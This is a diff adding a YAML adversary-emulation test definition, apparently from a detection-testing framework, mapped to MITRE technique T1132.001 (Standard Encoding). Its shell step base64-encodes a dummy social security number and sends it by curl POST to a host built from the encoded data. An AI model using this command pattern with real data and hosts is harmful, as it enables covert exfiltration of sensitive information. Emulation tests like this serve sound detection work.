@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Base64 Encoded data.
+description: |
+    Utilizing a common technique for posting base64 encoded data.
+args:
+    - name: destination_url
+      type: string
+      default: redcanary.com
+    - name: base64_data
+      type: string
+      default: MTExLTExLTExMTE=
+uuid: 1164f70f-9a88-4dff-b9ff-dc70e7bf0c25
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1132: Data Encoding'
+    subtechniques:
+        - 'T1132.001: Standard Encoding'
+requirements:
+    platforms:
+        - os: darwin
+        - os: linux
+steps:
+    - name: base64-encoded-data.
+      inline: |
+        echo -n 111-11-1111 | base64
+        curl -XPOST {{.Args.base64_data}}.{{.Args.destination_url}}
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
